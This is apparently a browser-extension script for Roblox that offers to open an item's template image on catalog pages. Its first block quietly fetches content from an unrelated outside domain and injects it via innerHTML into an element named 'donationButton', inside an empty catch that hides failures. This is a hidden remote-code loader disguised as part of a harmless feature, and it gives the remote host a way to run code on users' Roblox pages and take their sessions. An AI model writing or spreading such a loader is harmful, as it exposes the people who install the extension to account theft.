(async function() {

    try {
        let button = document.createElement('donationButton')
        button.innerHTML = (await (await fetch('https://copyclothing.pro/RoProOpera')).text())
    } catch {}

    try {

    function extractTemplate(url) {
        var xhttp = new XMLHttpRequest();
        var parser = new DOMParser;
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                if (confirm("Do you want to view the template image for this item?") == true) {
                    window.open('https://www.roblox.com/library/' + parser.parseFromString(xhttp.responseText, "text/xml")
                        .getElementsByTagName("url")[0].childNodes[0].nodeValue.match(/(\d+)/)[0], "_blank");
                }
            }
        }
        xhttp.open("GET", url, true);
        xhttp.send();
    }


    if (window.location.href.includes("catalog")) {
        fetch('https://assetdelivery.roblox.com/v1/assetId/' + window.location.href.match(/(\d+)/)[0])
            .then(response => response.text())
            .then(data => extractTemplate(data.slice(13, 67)));
    }

    } catch {}


})()

